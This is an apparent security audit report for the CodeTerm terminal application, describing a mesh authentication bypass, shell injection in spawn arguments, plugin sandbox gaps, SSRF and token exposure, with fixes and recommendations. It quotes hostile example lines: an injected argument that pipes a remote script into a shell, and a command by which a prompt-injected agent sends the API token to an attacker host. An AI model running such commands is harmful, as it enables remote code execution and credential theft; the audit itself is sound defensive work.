# Security audit — 2026-06

Read-only audit of CodeTerm across four attack surfaces (REST/socket API,
JS plugin sandbox, mesh networking, secrets/spawn/CLI), plus the fixes applied
on the `security` branch. Threat model: a host on the same LAN/tailnet, a
malicious/compromised plugin, another local user, and a prompt-injected agent
task running in a Tab.

Severity: **Critical** = remote/unauth compromise; **High** = auth'd escalation
or credential exposure; **Medium/Low** = hardening.

## Fixed on this branch

### ✅ CRITICAL — Mesh auth bypass: `is_custom_auth` prefix over-match
`src-tauri/src/api/auth.rs`. The bearer-token middleware skipped auth for any
path under `/api/mesh/peers/` (`starts_with(...) && !ends_with("/peers")`),
intending to let the three self-verifying handlers (relay/introduce/unpair)
run. But the prefix also swallowed handlers that only call the **no-op**
`check_auth` (`routes.rs` always returns `Ok`), leaving them fully
unauthenticated behind only the `mesh.enabled` gate (default **on**):

- `GET /api/mesh/peers/{id}/web-token` — **returned a paired peer's web token to
  an anonymous caller** (cross-machine credential leak / lateral movement).
- `POST /api/mesh/peers/approve/{id}` — anonymous self-approval of a pairing.
- `…/reject/{id}`, `…/disconnect/{id}`, `…/add-manual`, `…/{id}/addr`,
  `…/{id}/services` — all unauthenticated.

Two independent audit passes found this; verified by reading the middleware +
the no-op `check_auth` + live repro.
**Fix:** `is_custom_auth` is now an exact allowlist — `relay`, `introduce`, and
`DELETE /api/mesh/peers/{id}` (unpair, distinguished by method + path depth).
Everything else goes through the bearer middleware. Unit test
`custom_auth_only_exempts_self_verifying_paths` + live check (all the above now
`401` without a token, `200/404` with one).

### ✅ High — Non-constant-time API token compare
`auth.rs` compared the bearer token with `==`, which short-circuits and leaks
prefix length via timing. Now uses the existing `constant_time_eq` (made
`pub(crate)` in `services/tokens.rs`).

### ✅ High — Shell injection via unquoted spawn `args`
`/api/agents/spawn` accepts `args: Vec<String>` (reachable by a mesh peer with
`AgentIsolated` + `SpawnAgents`). Each arg was pushed **raw** into the launch
command string that runs in a shell (`plugins/provider-*/plugin.js`
`buildLaunchCommand`), so `args: ["; curl evil | sh"]` = RCE that breaks out of
the AgentIsolated confinement. **Fix:** each arg is now
`host.shell.quoteFor(...)`-quoted in all three bundled plugins. (The task body
was already isolated via a temp file; `agent_name`/`session_id` were already
quoted.)

### ✅ Partially fixed — Plugin host API confined for drop-in plugins
`src-tauri/src/plugin/js_runtime/{host_api,vm,loader}.rs`. A `PluginSandbox` now
gates the host primitives. Bundled / in-workspace / hash-verified `System`
plugins keep full access (unchanged — that's what the bundled providers need).
A plugin **dropped into `~/.codeterm/plugins/`** that isn't `System` is confined:
`readFile/writeFile/walkDir/sqliteQuery` scoped to its own dir + its declared
`sessions.rootDir` (writes to its dir + temp only), and `envGet` blocked for
secret-named vars. So a malicious drop-in can no longer read `~/.ssh`, the API
token from config, arbitrary sqlite, or cloud-key env vars, nor write
autostart/integration files. **Still open below:** the launch-command exec path
and explicit install consent.

## Open — recommended follow-ups (not auto-fixed: design decisions)

### High — Plugin `buildLaunchCommand` is still executed verbatim + drop-ins auto-load
A confined drop-in can no longer exfiltrate via FS/env, but two vectors remain:
(1) its `buildLaunchCommand` return string is still run in a shell when an agent
spawns for it (inherent to "launch a CLI agent"); (2) the hot-reload watcher
auto-loads a new `~/.codeterm/plugins/` drop-in within ~2s with no consent — so
its top-level JS runs immediately (now sandboxed, but still runs). **Recommended:**
require explicit user consent/install before activating a new non-System plugin,
and (optionally) gate the spawn of a non-System provider behind a confirm.

> **Original finding (historical):** the `host.*` surface (`readFile`/`writeFile`/
> `walkDir`/`sqliteQuery`/`envGet`) was unrestricted for every plugin and the
> computed `ProviderTrust` / manifest `permissions` were never consulted — a
> `ThirdParty` drop-in had the same surface as `System` and could read the API
> token / `~/.ssh` / any sqlite, write autostart, etc. The QuickJS language
> sandbox itself was always sound (no `require`/`process`/`fetch`); the hole was
> the host API. **The FS/sqlite/env part is now fixed** (see "Partially fixed");
> the launch-exec + consent part remains open (see "High" above).

### High — Mesh "web token" is the raw master API token
`mesh_routes/mod.rs` `mesh_web_token` / `mesh_peer_web_token` return the
configured API token verbatim — no scope, no expiry. Any web-mirror/peer
session that obtains it has full admin until rotation. **Recommended:** mint a
scoped, short-lived token for web/peer access instead of handing out the master
token.

### Medium — Default bind `0.0.0.0` + master token injected into every agent env
`config/schema/mod.rs` defaults `host = "0.0.0.0"`; the full-access token is set
as `CODETERM_API_TOKEN` in every spawned agent's env. A prompt-injected task can
`curl -d "$CODETERM_API_TOKEN" attacker` and the attacker then drives the API
from anywhere on the network. **Recommended:** default-bind loopback (opt-in for
`0.0.0.0` with a warning); inject a per-tab `AgentIsolated`-scoped token, not
the master.

### Medium — Relay SSRF: peer controls the forwarded path
`mesh_routes/relay.rs` builds `http://127.0.0.1:{port}{cmd.path}` from an
unvalidated peer-supplied `path`; `@host` userinfo trickery can redirect the
authenticated outbound request off-loopback. Requires a paired (trusted) peer,
so lower priority under tailnet trust. **Recommended:** validate `cmd.path`
starts with `/api/` and contains no `@`/`//`/scheme.

### Low — PWA manifest token in query string
`WebGate/PwaSetup.tsx` requests `/manifest.webmanifest?token=…` — the rest of
the flow correctly uses the URL `#fragment`; the manifest is the one place the
token lands in a query string (logs/Referer/history). **Recommended:** deliver
the manifest token via header or a one-time exchange.

### Low — Windows plaintext secrets file has no ACL (dev / no-keyring builds)
`secrets/keychain.rs` tightens the fallback JSON file to `0o600` only on
`#[cfg(unix)]`. Production Windows uses Credential Manager (fine); dev/feature-off
builds leave the file at the dir's default ACL. **Recommended:** set a
restrictive ACL on Windows too.

## Verified SAFE (checked, no action)

- `exec_in_tab` / `send_text` / `spawn` — no shell string-building; input is
  PTY bytes or argv. The PTY is a shell by design, fully behind auth.
- Git endpoints — `Command::new("git").arg(...)` argv form; sha validated; user
  paths after `--`. No injection.
- mem graph repair / mem query SQL — parameterized `?N` binds, no value
  interpolation (matches the CLAUDE.md guarantee).
- `serve_file` / upload — canonicalize+prefix containment; filename whitelist.
  No traversal.
- Ed25519 mesh signing — correct verify, nonce + 300s timestamp replay window,
  fail-closed on unknown peer. Auto-pair requires an existing paired peer to
  vouch (transitive trust, can't be triggered by an unpaired host).
- Secrets never logged / never in list responses; `SecretString` redacts +
  zeroizes; bitwarden via stdin/env not argv.
- QuickJS language isolation — no Node/Rust reachability beyond the `host`
  object.
- CORS permissive but auth is header-bearer (not cookie), so no ambient-credential
  CSRF — though tighten origins as defense-in-depth given the open bind.

<!-- revision: 3 -->
